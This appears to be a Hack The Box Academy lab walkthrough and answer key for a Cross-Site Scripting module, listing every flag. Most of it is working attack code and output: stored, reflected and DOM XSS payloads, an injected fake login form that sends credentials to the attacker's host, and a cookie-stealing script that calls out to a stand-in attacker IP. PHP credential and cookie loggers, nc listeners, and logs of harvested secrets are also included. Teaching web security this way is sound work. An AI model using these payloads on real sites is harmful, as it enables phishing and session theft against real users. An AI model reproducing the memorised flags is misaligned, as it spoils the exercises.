![[cheatsheat-Cross-Site Scripting (XSS)]]

|Section|Question Number|Answer|
|---|---|---|
|Stored XSS|Question 1|HTB{570r3d_f0r_3v3ry0n3_70_533}|
|Reflected XSS|Question 1|HTB{r3fl3c73d_b4ck_2_m3}|
|DOM XSS|Question 1|HTB{pur3ly_cl13n7_51d3}|
|XSS Discovery|Question 1|email|
|XSS Discovery|Question 2|reflected|
|Phishing|Question 1|HTB{r3f13c73d_cr3d5_84ck_2_m3}|
|Session Hijacking|Question 1|HTB{4lw4y5_53cur3_y0ur_c00k135}|
|Skills Assessment|Question 1|HTB{cr055_5173_5cr1p71n6_n1nj4}|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Stored XSS

## Question 1

### "To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing '1'."

After spawning the target machine, students need to navigate to its root page and use a stored XSS payload to show the cookie:

Code: javascript

```javascript
<script>alert(document.cookie)</script>
```

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_1.png)

After clicking the Enter/Return key on the keyboard, students will receive the flag as the value of the cookie:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_2.png)

Answer: `HTB{570r3d_f0r_3v3ry0n3_70_533}`

# Reflected XSS

## Question 1

### "To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing '1'."

After spawning the target machine, students need to navigate to its root page and use a XSS payload to show the cookie:

Code: javascript

```javascript
<script>alert(document.cookie)</script>
```

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_3.png)

After clicking on the "Add" button, students will receive the flag as the value for the cookie:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_4.png)

Answer: `HTB{r3fl3c73d_b4ck_2_m3}`

# DOM XSS

## Question 1

### "To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing '1'."

After spawning the target machine, students need to navigate to its root page and use a XSS payload to show the cookie:

Code: javascript

```javascript
<img src="" onerror=alert(document.cookie)>
```

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_5.png)

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_6.png)

Answer: `HTB{pur3ly_cl13n7_51d3}`

# XSS Discovery

## Question 1

### "Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?"

After spawning the target machine, students need to visit the root page of its website and register an account to get a valid URL so that they can inspect it:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_7.png)

Students will notice that URL has few parameters, including `email`, `http://STMIP:STMPO/?fullname=test&username=test&password=123&email=test%40email.com`:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_8.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_8.png)

When changing the value of "email" using the URL parameter, students will notice that the website reflects back the input:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_9.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_9.png)

If students try any basic Reflected XSS payload, they will know that the "email" parameter is vulnerable:

Code: javascript

```javascript
<script>alert(1)</script>
```

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_10.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_10.png)

Answer: `email`

# XSS Discovery

## Question 2

### "What type of XSS was found on the above server? "name only""

The type of XSS found in the previous question was `Reflected`, as it is showing the input in an error message after being processed.

Answer: `Reflected`

# Phishing

## Question 1

### "Try to find a working XSS payload for the Image URL form, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/login.php' and obtain the flag."

After spawning the target machine, students first need to navigate to the `/phishing` directory, `http://STMIP/phishing/`:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_11.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_11.png)

Students then need to try various XSS payloads to find a working one, and they will find that the following payload works:

Code: javascript

```javascript
'><script>alert(1)</script>
```

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_12.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_12.png)

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_13.png)

Subsequently, students now will proceed to the phishing attack, in which they will inject HTML that will display a login form, by using `document.write` on the following HTML:

Code: html

```html
<h3>Please login to continue</h3>
<form action=http://PWNIP:PWNPO>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Similar to the module's section, students need to remove the URL field using the `document.getElementById().remove()` function on the id `urlform`, and thus, the final JavaScript payload will be:

Code: javascript

```javascript
document.write('<h3>Please login to continue</h3><form action=http://PWNIP:PWNPO><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Subsequently, the final XSS payload becomes:

Code: javascript

```javascript
'><script>document.write('<h3>Please login to continue</h3><form action=http://PWNIP:PWNPO><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_14.png)

Afterward, students need to use the PHP script provided in the module's section and save it as "index.php" under `/tmp/tmpserver/` (a directory which they need to make) in Pwnbox/`PWNIP`, making sure that `STMIP` is replaced with the IP address of the spawned target machine:

Code: php

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://STMIP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Thereafter, students need to start a PHP server (using a port number other than 80, since it is already in use in Pwnbox) in `/tmp/tmpserver/` where "index.php" exists:

Code: php

```php
php -S 0.0.0.0:8080
```

```shell-session
┌─[us-academy-1]─[10.10.14.55]─[htb-ac413848@pwnbox-base]─[/tmp/tmpserver]
└──╼ [★]$ php -S 0.0.0.0:8080

[Mon Jul 18 05:20:12 2022] PHP 7.4.21 Development Server (http://0.0.0.0:8080) started
```

Students then need to visit the page `/phishing/send.php` and provide the full URL of the XSS payload injected web page:

`http://PWNIP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FPWNIP%3APWNPO%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--`

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_15.png)

After clicking on the "Send" button, students will notice that the PHP server has grabbed the credentials `admin:p1zd0nt57341myp455`:

```shell-session
[Mon Jul 18 05:42:39 2022] 10.129.120.157:57196 Accepted
[Mon Jul 18 05:42:39 2022] 10.129.120.157:57196 [302]: GET /?username=admin&password=p1zd0nt57341myp455&submit=Login
[Mon Jul 18 05:42:39 2022] 10.129.120.157:57196 Closing
```

At last, with the harvested credentials, students need to navigate to `/phishing/login.php` and log in to find the flag:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_16.png)

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_17.png)

Answer: `HTB{r3f13c73d_cr3d5_84ck_2_m3}`

# Session Hijacking

## Question 1

### "Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag."

After spawning the target machine, students first need to navigate to the `/hijacking` directory, `http://PWNIP/hijacking/`:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_18.png)

Students then need to start an `nc` listener using a port number other than 80, since it is already in use in Pwnbox:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.55]─[htb-ac413848@pwnbox-base]─[/tmp/tmpserver]
└──╼ [★]$ nc -nvlp 8080

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
```

Thereafter, students need to test all the parameters of the web page with XSS payloads to see which of them is vulnerable and makes a call to the `nc` listener; students will find that the following payload works when provided to the "Profile Picture URL" parameter:

Code: javascript

```javascript
"><script src=http://PWNIP:PWNPO/script.js></script>
```

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_19.png)

After clicking on the "Register" button, students will notice that the `nc` listener received a request for the "script.js" file:

```shell-session
Ncat: Connection from 10.129.122.106.
Ncat: Connection from 10.129.122.106:32892.

GET /script.js HTTP/1.1
Host: 10.10.14.55:8080
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Before continuing, students need to make a directory under `/tmp/` to store the files that will be used hereafter.

Students now need to edit the "script.js" (which should be in the directory created in the `/tmp/` directory) file and have its contents to be JavaScript code that will grab the session cookie and send it to Pwnbox/`PWNIP`, such as the following one used in the module's section:

Code: javascript

```javascript
new Image().src='http://PWNIP:PWNPO/index.php?c='+document.cookie;
```

In addition to "script.js", students need to save the PHP script "index.php" provided in the module's section which will split multiple cookies with a new line and write them to a file in case they are more than one:

Code: php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Subsequently, students need to start a PHP server (using a port number other than 80, since it is already in use in Pwnbox) in `/tmp/tmpserver` where "index.php" exists and, make sure that `PWNIP` matches the one used in "script.js":

Code: php

```php
php -S 0.0.0.0:8080
```

```shell-session
┌─[us-academy-1]─[10.10.14.55]─[htb-ac413848@pwnbox-base]─[/tmp/tmpserver]
└──╼ [★]$ php -S 0.0.0.0:8080

[Mon Jul 18 05:20:12 2022] PHP 7.4.21 Development Server (http://0.0.0.0:8080) started
```

Afterward, students need to use the XSS payload first used to identify the vulnerable "Profile Picture URL" parameter again:

Code: javascript

```javascript
"><script src=http://PWNIP:PWNPO/script.js></script>
```

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_20.png)

After clicking on the "Register" button, students will notice that the PHP server listening has grabbed a cookie with the value `c00k1355h0u1d8353cu23d`:

```shell-session
[Mon Jul 18 09:43:33 2022] 10.129.122.121:48154 Accepted
[Mon Jul 18 09:43:33 2022] 10.129.122.121:48154 [200]: (null) /script.js
[Mon Jul 18 09:43:33 2022] 10.129.122.121:48154 Closing
[Mon Jul 18 09:43:33 2022] 10.129.122.121:48156 Accepted
[Mon Jul 18 09:43:33 2022] 10.129.122.121:48156 [200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
[Mon Jul 18 09:43:33 2022] 10.129.122.121:48156 Closing
```

Thus, students need to visit `/hijacking/login.php` and add the grabbed cookie as `cookie:c00k1355h0u1d8353cu23d` under the "Storage" tab in Firefox:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_21.png)

Then at last, students need to refresh the page to attain the flag:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_22.png)

Answer: `HTB{4lw4y5_53cur3_y0ur_c00k135}`

# Skills Assessment

## Question 1

### "What is the value of the 'flag' cookie?"

After spawning the target machine, students need to visit it's`/assessment` page and notice that it says "comments must be approved by an admin":

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_23.png)

Therefore, students need to hijack the cookie of the admin. Scrolling down, students will notice that there is a post named "Welcome to Security Blog", thus, they need to click on it:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_24.png)

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_25.png)

Students need to test all the fields with XSS payloads, however, they will come to know that the "Website" field is vulnerable to a blind XSS; to test the fields, students first need to start an `nc` listener:

Code: shell

```shell
nc -nvlp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-nvwebl9plw]─[~]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Then, they need to use the payload `'><script src="http://PWNIP:PWNPO/FieldName"></script>` in the all of the fields to see which ones will request a file to the `nc` listener:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_26.png)

However, the name and email fields are to be left out:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_27.png)

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_28.png)

After clicking on "Post Comment", students will notice that the request came for `/WebsiteField`:

```shell-session
Ncat: Connection from 10.129.43.173.
Ncat: Connection from 10.129.43.173:42254.
GET /WebsiteField HTTP/1.1
Host: 10.10.14.41:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.101 Safari/537.36
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Now that students have identified the vulnerable field, they need to write a JS cookie grabber to a local file (named `script.js`) so that it get requested for:

Code: js

```js
new Image().src='http://PWNIP:PWNPO/index.php?c=' + document.cookie;
```

Students can use `cat` to save the cookie grabber into a file:

Code: shell

```shell
cat << 'EOF' > script.js
new Image().src='http://10.10.14.41:9001/index.php?c=' + document.cookie;
EOF
```

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-nvwebl9plw]─[~]
└──╼ [★]$ cat << 'EOF' > script.js
> new Image().src='http://10.10.14.41:9001/index.php?c=' + document.cookie;
> EOF
```

Subsequently, students need to write a PHP script (named `index.php`) that will split cookies in case many were received (and writes them to a file):

Code: php

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Then, students need to start an HTTP server with PHP in the same directory where `script.js` and `index.php` are:

Code: shell

```shell
php -S 0.0.0.0:PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-nvwebl9plw]─[~]
└──╼ [★]$ php -S 0.0.0.0:9001

[Tue Nov 29 04:14:23 2022] PHP 7.4.30 Development Server (http://0.0.0.0:9001) started
```

At last, students need to use the XSS payload `'><script src=http://PWNIP:PWNPO/script.js></script>` in the "Website" field so that the user clicking the link will request `script.js` and get their cookie stolen:

![Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/45/Cross-Site_Scripting_LTPSXSSRTPS_Walkthrough_Image_29.png)

On the HTTP server, students will notice that the flag `HTB{cr055_5173_5cr1p71n6_n1nj4}` is contained within the cookie value:

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-nvwebl9plw]─[~]
└──╼ [★]$ php -S 0.0.0.0:9001
[Tue Nov 29 04:14:23 2022] PHP 7.4.30 Development Server (http://0.0.0.0:9001) started
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42532 Accepted
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42534 Accepted
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42532 [200]: (null) /script.js
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42534 [200]: GET /WebsiteField
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42534 Closing
[Tue Nov 29 04:15:15 2022] 10.129.43.173:42532 Closing
[Tue Nov 29 04:15:16 2022] 10.129.43.173:42536 Accepted
[Tue Nov 29 04:15:16 2022] 10.129.43.173:42536 [200]: GET /index.php?c=wordpress_test_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1669695315;%20flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
[Tue Nov 29 04:15:16 2022] 10.129.43.173:42536 Closing
```

Answer: `HTB{cr055_5173_5cr1p71n6_n1nj4}`